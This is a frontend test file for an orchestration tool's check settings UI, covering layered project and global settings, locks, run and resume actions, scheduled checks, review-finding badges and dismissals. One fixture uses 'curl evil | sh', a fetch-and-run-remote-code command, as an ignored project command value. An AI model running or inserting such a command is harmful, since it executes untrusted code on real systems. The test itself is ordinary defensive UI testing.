// @vitest-environment jsdom
/**
 * Checks spec 2026-10-22 §4.3, §4.4, §6.5, §7, criterion 11 (plan Task 10): the check settings of a project and of the
 * global layer, each field with the layer it came from; the person's acts on a check (override, reset to inherited, run
 * now, resume, scheduled checks, locks) are sent under the revision the read named, and only by a person who may
 * (human-only verbs); a model-review finding's badge on an involved group's card; dismissing a finding goes to the
 * REVIEW group with the note, whatever card it was dismissed from; the review's own detail; the `review` agent slot.
 */
import { cleanup, fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import type { JSX } from "react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { AccountContext } from "../src/AuthGate.js";
import type { Me } from "../src/auth.js";
import { preferencesFromDrafts } from "../src/AgentSettings.js";
import { BoardView } from "../src/BoardView.js";
import { ChecksSettings } from "../src/ChecksSettings.js";
import { ControlGroupView } from "../src/ControlGroupView.js";
import type { AgentPreferencesViewV1, AgentsViewV1, ChecksReadV1, CheckSourceV1, CheckStateV1, CheckTriggerV1, GroupDecisionsViewV1, GroupSummaryV1, ReviewRecordV1 } from "../src/controlTypes.js";
import { ProjectSettings } from "../src/ProjectSettings.js";
import { ReviewDetail } from "../src/ReviewDetail.js";
import "../src/i18n.js";
import { config, run, view, workItem } from "./fixtures/board.js";

afterEach(cleanup);

const owner: Me = { user: { id: "u1", name: "olga", roles: ["owner"], mustChangePassword: false }, expiresAt: 0, sessionDays: 15 };
const member: Me = { user: { id: "u2", name: "amy", roles: ["member"], mustChangePassword: false }, expiresAt: 0, sessionDays: 15 };
const as = (me: Me, node: JSX.Element): JSX.Element => <AccountContext.Provider value={me}>{node}</AccountContext.Provider>;
const jsonResponse = (body: unknown, status = 200): Response => new Response(JSON.stringify(body), { status, headers: { "content-type": "application/json" } });

const S = <T,>(value: T, source: CheckSourceV1 = "builtin", lockedBy: "global" | null = null) => ({ value, source, lockedBy });
const INTEGRATION_TRIGGER: CheckTriggerV1 = { all: [{ any: [{ kind: "landed-groups", min: 2 }] }, { any: [{ kind: "queue-idle" }, { kind: "since-last", ms: 21_600_000 }] }] };
const REVIEW_TRIGGER: CheckTriggerV1 = { all: [{ any: [{ kind: "conflict-reconciled" }, { kind: "overlapping-files", minGroups: 2 }] }, { any: [{ kind: "since-last", ms: 604_800_000 }] }] };
const SHA = "0123456789abcdef0123456789abcdef01234567";
const state = (over: Partial<CheckStateV1> = {}): CheckStateV1 => ({
  watermark: SHA, lastStartAt: 1, lastSlot: {}, runSeq: 1, failureStreak: 0, paused: false, pendingRun: null, rebased: false,
  last: { state: "completed", at: 1, from: null, to: SHA, groups: ["g1", "g2"], detail: null, reviewGroupId: null, debugGroupIds: [], recordHash: null }, ...over,
});
const WEEKLY = { id: "weekly", kind: "model-review" as const, cron: "0 9 * * 1", enabled: true, params: {} };
const SLOT = Date.UTC(2026, 9, 26, 1, 0, 0);
const projectRead = (over: Partial<ChecksReadV1> = {}): ChecksReadV1 => ({
  schema: "orca-checks-v1", repoId: "repo",
  kinds: {
    "integration-check": { enabled: S(true, "project"), trigger: S(INTEGRATION_TRIGGER), command: S<string | null>("npm ci && npm test", "global", "global") },
    "model-review": { enabled: S(true, "global"), trigger: S(REVIEW_TRIGGER), budgetTokens: S(1_000_000), maxGroupsPerReview: S(12) },
  },
  scheduled: [{ ...S(WEEKLY, "global"), scope: "global" }],
  locks: ["integrationCheck.command"],
  state: [{ kind: "integration-check", target: "main", state: state() }, { kind: "model-review", target: "main", state: state() }],
  revision: 3, nextSlots: { weekly: [SLOT] }, ...over,
});

let posts: Array<{ url: string; body: { expectedRevision: number; payload: unknown } }>;
let reads: string[];
const serve = (body: ChecksReadV1 | ((url: string) => unknown)) => {
  posts = []; reads = [];
  document.cookie = "orca_csrf=t";
  globalThis.fetch = (async (input: RequestInfo | URL, init?: RequestInit): Promise<Response> => {
    const url = String(input), method = init?.method ?? "GET";
    if (method === "POST") { posts.push({ url, body: JSON.parse(String(init!.body)) }); return jsonResponse({ schema: "orca-command-success-v1" }); }
    reads.push(url);
    return jsonResponse(typeof body === "function" ? body(url) : body);
  }) as typeof fetch;
};
const field = (kind: string, name: string): HTMLElement => screen.getByTestId(`check-field-${kind}-${name}`);
const shown = async (): Promise<void> => { await waitFor(() => expect(screen.getByTestId("check-field-model-review-enabled")).toBeTruthy()); };

describe("the check settings' source layer (spec §4.3, criterion 11)", () => {
  beforeEach(() => serve(projectRead()));

  it("badges each field with the layer it came from, and a locked one as locked", async () => {
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    expect(reads).toContain("/api/control/checks?repoId=repo");
    // mutation: render the global value's badge as `project` -> "project", red
    expect(within(field("model-review", "enabled")).getByTestId("check-source").textContent).toBe("global");
    expect(within(field("integration-check", "enabled")).getByTestId("check-source").textContent).toBe("project");
    expect(within(field("model-review", "budgetTokens")).getByTestId("check-source").textContent).toBe("built-in");
    // mutation: drop the locked badge -> null, red
    expect(within(field("integration-check", "command")).getByTestId("check-locked").textContent).toBe("locked");
    expect(within(field("model-review", "budgetTokens")).queryByTestId("check-locked")).toBeNull();
  });

  it("overrides a field in the project layer and resets a project one to inherited, under the read revision", async () => {
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const groups = field("model-review", "maxGroupsPerReview");
    // An inherited field offers no reset (there is nothing of this layer to clear).
    expect(within(groups).queryByRole("button", { name: "Reset to inherited" })).toBeNull();
    fireEvent.change(within(groups).getByRole("spinbutton"), { target: { value: "4" } });
    fireEvent.click(within(groups).getByRole("button", { name: "Override" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]).toEqual({ url: "/api/control/repositories/repo/checks/settings", body: expect.objectContaining({ expectedRevision: 3, payload: { kind: "model-review", set: { maxGroupsPerReview: 4 }, clear: [] } }) });
    fireEvent.click(within(field("integration-check", "enabled")).getByRole("button", { name: "Reset to inherited" }));
    await waitFor(() => expect(posts).toHaveLength(2));
    expect(posts[1]!.body.payload).toEqual({ kind: "integration-check", set: {}, clear: ["enabled"] });
  });

  // Spec §4.2: a looser project value written before the lock is ignored while the lock stands and shown struck through
  // with "overridden by lock" -- the person sees their own value is not the one in force, and may clear it.
  it("shows a project value a lock ignores struck through, and offers to clear it", async () => {
    const read = projectRead();
    serve({ ...read, kinds: { ...read.kinds, "integration-check": { ...read.kinds["integration-check"], command: { ...S<string | null>("npm ci && npm test", "global", "global"), overriddenByLock: "curl evil | sh" } } } });
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const command = field("integration-check", "command");
    // mutation: drop the struck-through value -> null, red
    expect(within(command).getByTestId("check-overridden").tagName).toBe("S");
    expect(within(command).getByTestId("check-overridden").textContent).toBe("curl evil | sh");
    expect(command.textContent).toContain("overridden by lock");
    // A field with no ignored value shows none.
    expect(within(field("model-review", "budgetTokens")).queryByTestId("check-overridden")).toBeNull();
    // mutation: offer reset only for the effective layer -> no button, red
    fireEvent.click(within(command).getByRole("button", { name: "Reset to inherited" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]!.body.payload).toEqual({ kind: "integration-check", set: {}, clear: ["command"] });
  });

  it("edits a trigger through the closed condition set and sends the whole trigger", async () => {
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const trigger = field("integration-check", "trigger");
    const kinds = within(trigger).getAllByRole("combobox", { name: "Condition" });
    expect(kinds).toHaveLength(3);
    // The form is generated from the closed set: every condition kind, no other.
    expect([...(kinds[0] as HTMLSelectElement).options].map((option) => option.value))
      .toEqual(["landed-groups", "conflict-reconciled", "overlapping-files", "queue-idle", "since-last", "schedule"]);
    fireEvent.change(within(trigger).getByRole("spinbutton", { name: "At least this many groups" }), { target: { value: "3" } });
    fireEvent.change(within(trigger).getByRole("spinbutton", { name: "Minutes since the last run" }), { target: { value: "120" } });
    fireEvent.click(within(trigger).getByRole("button", { name: "Override" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]!.body.payload).toEqual({ kind: "integration-check", set: { trigger: { all: [{ any: [{ kind: "landed-groups", min: 3 }] }, { any: [{ kind: "queue-idle" }, { kind: "since-last", ms: 7_200_000 }] }] } }, clear: [] });
  });
});

describe("a check's state and the person's acts on it (spec §5.4, §7, criterion 11)", () => {
  it("shows the watermark and last run; Run now sends run-check-now for the kind", async () => {
    serve(projectRead());
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const target = screen.getByTestId("check-state-model-review-main");
    expect(within(target).getByTestId("check-watermark").textContent).toContain("0123456");
    expect(within(target).queryByRole("button", { name: "Resume" })).toBeNull();
    fireEvent.click(within(screen.getByRole("region", { name: "Model review" })).getByRole("button", { name: "Run now" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    // mutation: send run-check-now to the resume route -> red
    expect(posts[0]).toEqual({ url: "/api/control/repositories/repo/checks/run", body: expect.objectContaining({ expectedRevision: 3, payload: { kind: "model-review" } }) });
  });

  it("a paused check says so and offers Resume, which sends resume-check", async () => {
    serve(projectRead({ state: [{ kind: "integration-check", target: "main", state: state({ failureStreak: 3, paused: true, last: { ...state().last!, state: "errored", detail: "spawn failed" } }) }] }));
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const target = screen.getByTestId("check-state-integration-check-main");
    expect(within(target).getByTestId("check-paused").textContent).toBe("Paused after 3 failed runs in a row.");
    // mutation: drop the paused branch -> no Resume, red
    fireEvent.click(within(target).getByRole("button", { name: "Resume" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]).toEqual({ url: "/api/control/repositories/repo/checks/resume", body: expect.objectContaining({ expectedRevision: 3, payload: { kind: "integration-check" } }) });
  });

  it("a model review that found no agent profiles says what to do", async () => {
    serve(projectRead({ state: [{ kind: "model-review", target: "main", state: state({ last: { ...state().last!, state: "skipped", detail: "no-profiles" } }) }] }));
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    // mutation: drop the no-profiles hint -> null, red
    expect(screen.getByTestId("check-hint-no-profiles").textContent).toContain("confirm a group");
    cleanup();
    serve(projectRead());
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    expect(screen.queryByTestId("check-hint-no-profiles")).toBeNull();
  });

  it("lists the scheduled checks with their cron and next run, and turns one off", async () => {
    serve(projectRead());
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const entry = screen.getByTestId("check-scheduled-weekly");
    expect(entry.textContent).toContain("0 9 * * 1");
    expect(within(entry).getByTestId("check-source").textContent).toBe("global");
    // mutation: drop the next-slot line -> null, red
    expect(within(entry).getByTestId("check-next").textContent).toContain(new Date(SLOT).toLocaleString());
    fireEvent.click(within(entry).getByRole("checkbox", { name: "On" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    // In the project scope, a global entry is overridden by a project entry of the same id (spec §4.1).
    expect(posts[0]).toEqual({ url: "/api/control/repositories/repo/checks/scheduled", body: expect.objectContaining({ expectedRevision: 3, payload: { id: "weekly", kind: "model-review", cron: "0 9 * * 1", enabled: false } }) });
  });

  it("a member reads every value but is offered no write (human-only verbs, spec §4.4)", async () => {
    serve(projectRead({ state: [{ kind: "integration-check", target: "main", state: state({ failureStreak: 3, paused: true }) }] }));
    render(as(member, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    expect(within(field("model-review", "enabled")).getByTestId("check-source").textContent).toBe("global");
    // mutation: drop the human-only gate -> buttons shown, red
    for (const name of ["Run now", "Resume", "Override", "Reset to inherited", "Save"]) expect(screen.queryByRole("button", { name })).toBeNull();
    expect(screen.queryByRole("checkbox", { name: "On" })).toBeNull();
  });
});

describe("the global layer (spec §4.2, §7)", () => {
  const globalRead = (): ChecksReadV1 => ({ ...projectRead(), repoId: null, state: [], revision: 7, kinds: { ...projectRead().kinds, "integration-check": { ...projectRead().kinds["integration-check"], enabled: S(false), command: S<string | null>("npm ci && npm test", "global") } } });

  it("reads the global layer, offers no run now, and saves the locks under the @orchestration revision", async () => {
    serve(globalRead());
    render(as(owner, <ChecksSettings scope="global" />));
    await shown();
    expect(reads).toContain("/api/control/checks");
    expect(screen.queryByRole("button", { name: "Run now" })).toBeNull();
    const locks = screen.getByRole("region", { name: "Locks" });
    expect((within(locks).getByRole("checkbox", { name: "Integration check command" }) as HTMLInputElement).checked).toBe(true);
    fireEvent.click(within(locks).getByRole("checkbox", { name: "Model review token budget" }));
    fireEvent.click(within(locks).getByRole("button", { name: "Save locks" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]).toEqual({ url: "/api/control/operator/checks/locks", body: expect.objectContaining({ expectedRevision: 7, payload: { locks: ["integrationCheck.command", "modelReview.budgetTokens"] } }) });
  });

  it("a global field is saved and reset in the global layer", async () => {
    serve(globalRead());
    render(as(owner, <ChecksSettings scope="global" />));
    await shown();
    fireEvent.click(within(field("integration-check", "command")).getByRole("button", { name: "Reset to inherited" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]).toEqual({ url: "/api/control/operator/checks/settings", body: expect.objectContaining({ expectedRevision: 7, payload: { kind: "integration-check", set: {}, clear: ["command"] } }) });
  });

  // Moved from integrationCheck.test.tsx (kanban spec §7 layer 1): the integration check turned on, with a command sent
  // trimmed, each in the layer it is saved from, under the read revision; and how the newest run ended, naming the debug
  // group a red one opened.
  it("turns the integration check on and sets its command, trimmed", async () => {
    serve(globalRead());
    render(as(owner, <ChecksSettings scope="global" />));
    await shown();
    const enabled = field("integration-check", "enabled");
    fireEvent.click(within(enabled).getByRole("checkbox", { name: "Event trigger on" }));
    fireEvent.click(within(enabled).getByRole("button", { name: "Override" }));
    await waitFor(() => expect(posts).toHaveLength(1));
    expect(posts[0]!.body).toMatchObject({ expectedRevision: 7, payload: { kind: "integration-check", set: { enabled: true }, clear: [] } });
    const command = field("integration-check", "command");
    const save = within(command).getByRole("button", { name: "Save" }) as HTMLButtonElement;
    // mutation: an unchanged value of this layer can be saved -> enabled, red
    expect(save.disabled).toBe(true);
    fireEvent.change(within(command).getByRole("textbox", { name: "Command (instead of the groups' own checks)" }), { target: { value: "  npm test  " } });
    fireEvent.click(save);
    await waitFor(() => expect(posts).toHaveLength(2));
    // mutation: send the command untrimmed -> "  npm test  ", red
    expect(posts[1]!.body.payload).toEqual({ kind: "integration-check", set: { command: "npm test" }, clear: [] });
  });

  it("says how the newest check ended, naming the debug group a red one opened", async () => {
    serve(projectRead({ state: [{ kind: "integration-check", target: "main", state: state({ failureStreak: 1, last: { ...state().last!, state: "failed", detail: "npm test", debugGroupIds: ["sysdebug-integration-check-0123456789abcdef"] } }) }] }));
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    const last = within(screen.getByTestId("check-state-integration-check-main")).getByTestId("check-last").textContent!;
    expect(last).toContain("Last run: failed at");
    expect(last).toContain("(npm test). Debug groups opened: sysdebug-integration-check-0123456789abcdef.");
  });

  it("the project scope has no locks editor; a member sees no locks editor anywhere", async () => {
    serve(projectRead());
    render(as(owner, <ChecksSettings scope={{ repoId: "repo" }} />));
    await shown();
    expect(screen.queryByRole("region", { name: "Locks" })).toBeNull();
    cleanup();
    serve(globalRead());
    render(as(member, <ChecksSettings scope="global" />));
    await shown();
    expect(screen.queryByRole("button", { name: "Save locks" })).toBeNull();
  });
});

describe("Project settings show the checks in place of the integration check (spec §7)", () => {
  it("reads the project's checks", async () => {
    serve(projectRead());
    render(as(owner, <ProjectSettings repoId="repo" repoLabel="Repo" workspace={null} integration={null} onWorkspaceMode={vi.fn()} onIntegrationScheme={vi.fn()} />));
    await shown();
    expect(screen.getByRole("region", { name: "Checks" })).toBeTruthy();
    expect(reads).toContain("/api/control/checks?repoId=repo");
  });
});

const summary = (over: Partial<GroupSummaryV1>): GroupSummaryV1 => ({
  groupId: "g", repoId: "r", state: "running", commandRevision: 7, projectionSeq: 1, stopMode: null, stopState: null, claimBlocked: false, recoveryBlockerCount: 0,
  completion: { done: 0, total: 2 }, counts: { idle: 1, running: 1, waiting: 0, blocked: 0, done: 0 }, executionPending: false, ...over,
});

describe("a review finding's badge on an involved group's card (spec §7, criterion 11)", () => {
  it("major red, minor grey; none without findings", () => {
    const card = { budget: { usedTokens: 10, limitTokens: null }, pendingDecisions: 0, firstFailure: null };
    render(<BoardView groups={[summary({ groupId: "g", card: { ...card, reviewFindings: { major: 1, minor: 2 } } }), summary({ groupId: "h", card })]} scope={{ kind: "all" }} onOpen={vi.fn()} onCommand={vi.fn()} />);
    const major = within(screen.getByTestId("board-card-g")).getByTestId("board-card-findings-major");
    const minor = within(screen.getByTestId("board-card-g")).getByTestId("board-card-findings-minor");
    expect([major.textContent, major.getAttribute("data-tone")]).toEqual(["1 major review finding", "danger"]);
    // mutation: draw minor red -> data-tone danger, red
    expect([minor.textContent, minor.getAttribute("data-tone")]).toEqual(["2 minor review findings", null]);
    expect(within(screen.getByTestId("board-card-h")).queryByTestId("board-card-findings-major")).toBeNull();
    expect(within(screen.getByTestId("board-card-h")).queryByTestId("board-card-findings-minor")).toBeNull();
  });
});

const decisions = (groupFlags: NonNullable<GroupDecisionsViewV1["groupFlags"]>): GroupDecisionsViewV1 => ({
  schema: "orca-group-decisions-v1", groupId: "g", projectKey: null, pendingCount: 0, flaggedCount: groupFlags.length, groupFlags, tasks: [],
});
const FINDING = { decisionId: "model-review:sysreview-x:f1", state: "flagged" as const, source: "model-review", reason: "contract-drift: two error shapes", evidence: ["g:src/a.ts:3", "h:src/b.ts:9"], severity: "major" as const };

describe("dismissing a model-review finding (spec §6.5, §6.6, criterion 11, review focus 5)", () => {
  const showGroup = (flag: NonNullable<GroupDecisionsViewV1["groupFlags"]>[number], onCommand = vi.fn()) => {
    render(<ControlGroupView focus={{ kind: "group", groupId: "g", region: "progress", taskId: null, runId: null }}
      view={view([workItem({ taskId: "a", currentRunId: "run-a" })], [run({ runId: "run-a", state: "settled-recoverable" })])}
      config={config} uncertain={[]} drafts={{}} onDraft={vi.fn()} onCommand={onCommand}
      revisionOf={(groupId) => (groupId === "sysreview-x" ? 9 : null)} decisions={decisions([flag])} />);
    return onCommand;
  };

  it("posts ratify-flagged-decision with the note to the REVIEW group, under its revision, from an involved group's view", () => {
    const onCommand = showGroup({ ...FINDING, ownerGroupId: "sysreview-x" });
    const line = screen.getByTestId("group-flag");
    expect(line.textContent).toContain("major");
    expect(within(line).queryByRole("button", { name: "Ratify" })).toBeNull();
    fireEvent.change(within(line).getByRole("textbox", { name: "Why dismiss (optional)" }), { target: { value: "  two shapes on purpose  " } });
    fireEvent.click(within(line).getByRole("button", { name: "Dismiss" }));
    // mutation: ratify to the clicked card's group -> groupId "g", revision 6, red
    expect(onCommand).toHaveBeenCalledTimes(1);
    expect(onCommand.mock.calls[0]![0]).toEqual({ verb: "ratify-flagged-decision", groupId: "sysreview-x", expectedRevision: 9, payload: { decisionId: FINDING.decisionId, note: "two shapes on purpose" } });
  });

  it("opens the REVIEW group's detail from an involved group's finding", async () => {
    serve((url) => (url === "/api/control/checks/reviews/sysreview-x" ? RECORD : null));
    showGroup({ ...FINDING, ownerGroupId: "sysreview-x" });
    fireEvent.click(within(screen.getByTestId("group-flag")).getByRole("button", { name: "Review detail" }));
    // mutation: open the clicked group's detail -> region "Model review g", red
    const region = await screen.findByRole("region", { name: "Model review sysreview-x" });
    await waitFor(() => expect(within(region).getByTestId("review-finding-f1").textContent).toContain("two error shapes"));
  });

  it("sends no note when none was written; on the review group itself it targets that group", () => {
    const onCommand = showGroup(FINDING);
    fireEvent.click(within(screen.getByTestId("group-flag")).getByRole("button", { name: "Dismiss" }));
    expect(onCommand.mock.calls[0]![0]).toEqual({ verb: "ratify-flagged-decision", groupId: "g", expectedRevision: 6, payload: { decisionId: FINDING.decisionId } });
  });

  it("a minor finding is grey, not red; an owner whose revision is unknown cannot be dismissed to", () => {
    showGroup({ ...FINDING, severity: "minor", ownerGroupId: "sysreview-unknown" });
    const line = screen.getByTestId("group-flag");
    expect(within(line).getByTestId("group-flag-severity").getAttribute("data-tone")).toBeNull();
    // mutation: fall back to the clicked group's revision -> enabled, red
    expect((within(line).getByRole("button", { name: "Dismiss" }) as HTMLButtonElement).disabled).toBe(true);
  });
});

const RECORD: ReviewRecordV1 = {
  schema: "orca-model-review-record-v1", reviewGroupId: "sysreview-x", runId: "run-1", range: { target: "main", from: "a".repeat(40), to: "b".repeat(40) }, groups: ["g", "h"],
  valid: [{ id: "f1", category: "contract-drift", severity: "major", title: "two error shapes", explanation: "g throws, h returns", evidence: [{ groupId: "g", path: "src/a.ts", line: 3, note: "throws" }, { groupId: "h", path: "src/b.ts", line: 9, note: "" }], suggestedFix: "pick one" }],
  dropped: [{ findingId: "f2", reason: "evidence-single-group" }],
  routed: [{ findingId: "f1", severity: "major", debugGroupId: "sysdebug-model-review-finding-1", detail: null }],
  dismissals: [{ decisionId: "model-review:sysreview-x:f1", by: "owner", at: "2026-10-22T00:00:00.000Z", note: "two shapes on purpose" }],
};

describe("the review detail (spec §7)", () => {
  it("shows the range, groups, findings with evidence, dropped ones with reasons, dismissals with notes and the debug groups opened", async () => {
    serve((url) => (url === "/api/control/checks/reviews/sysreview-x" ? RECORD : null));
    render(<ReviewDetail reviewGroupId="sysreview-x" />);
    const region = await screen.findByRole("region", { name: "Model review sysreview-x" });
    await waitFor(() => expect(within(region).getByTestId("review-range").textContent).toContain("aaaaaaa..bbbbbbb on main"));
    expect(within(region).getByTestId("review-groups").textContent).toContain("g, h");
    expect(within(region).getByTestId("review-finding-f1").textContent).toContain("two error shapes");
    expect(within(region).getByTestId("review-finding-f1").textContent).toContain("group g, src/a.ts:3");
    expect(within(region).getByTestId("review-dropped").textContent).toContain("f2: evidence-single-group");
    expect(within(region).getByTestId("review-dismissals").textContent).toContain("two shapes on purpose");
    expect(within(region).getByTestId("review-debug").textContent).toContain("sysdebug-model-review-finding-1");
  });

  // Spec §7: the review group shows as a system card, and the card opens the group's view -- which is where the review's
  // detail must be, or a person who follows the card never reaches the findings. A finding's fix group is not a review.
  const systemGroup = (source: NonNullable<GroupSummaryV1["systemDebug"]>["source"]) => {
    const base = view([]);
    return { ...base, summary: { ...base.summary, systemDebug: { source, stackOn: null, settled: null } } };
  };
  const showView = (v: ReturnType<typeof view>) => render(<ControlGroupView focus={{ kind: "group", groupId: "g", region: "progress", taskId: null, runId: null }}
    view={v} config={config} uncertain={[]} drafts={{}} onDraft={vi.fn()} onCommand={vi.fn()} />);

  it("a review group's own view shows its review's detail", async () => {
    serve((url) => (url === "/api/control/checks/reviews/g" ? { ...RECORD, reviewGroupId: "g" } : null));
    // mutation: drop the review detail from the review group's view -> no region, red
    showView(systemGroup({ kind: "model-review", repoId: "orca", target: "main", from: "a".repeat(40), to: "b".repeat(40), runSeq: 1 }));
    const region = await screen.findByRole("region", { name: "Model review g" });
    await waitFor(() => expect(within(region).getByTestId("review-finding-f1").textContent).toContain("two error shapes"));
  });

  it("a finding's fix group shows no review detail of its own", () => {
    serve(() => RECORD);
    // mutation: show it on any system group -> a region, red
    showView(systemGroup({ kind: "model-review-finding", repoId: "orca", reviewGroupId: "sysreview-x", findingId: "f1" }));
    expect(screen.queryByRole("region", { name: /^Model review / })).toBeNull();
    expect(reads.filter((url) => url.startsWith("/api/control/checks/reviews/"))).toEqual([]);
  });
});

const AGENTS: AgentsViewV1 = {
  schema: "orca-agents-view-v1",
  installations: [{ id: "claude", kind: "claude", defaults: { model: "claude-opus-5-5", contextWindow: "agent-default" }, contextOptions: ["agent-default"], version: "2.1.282" }],
};
const PREFS: AgentPreferencesViewV1 = { schema: "orca-agent-preferences-v1", operatorId: "operator-1", revision: 4, preferences: { defaultAgent: "claude", perAgent: {} } };

describe("the review agent slot (spec §6.1, §7)", () => {
  it("is saved like the estimator and reconcile slots", () => {
    // mutation: leave `review` out of the saved preferences -> undefined, red
    expect(preferencesFromDrafts(AGENTS, PREFS, { "agents:review:model": "claude-fable-5" }).review).toEqual({ model: "claude-fable-5" });
    expect(preferencesFromDrafts(AGENTS, { ...PREFS, preferences: { ...PREFS.preferences, review: { model: "m" } } }, {}).review).toEqual({ model: "m" });
  });
});
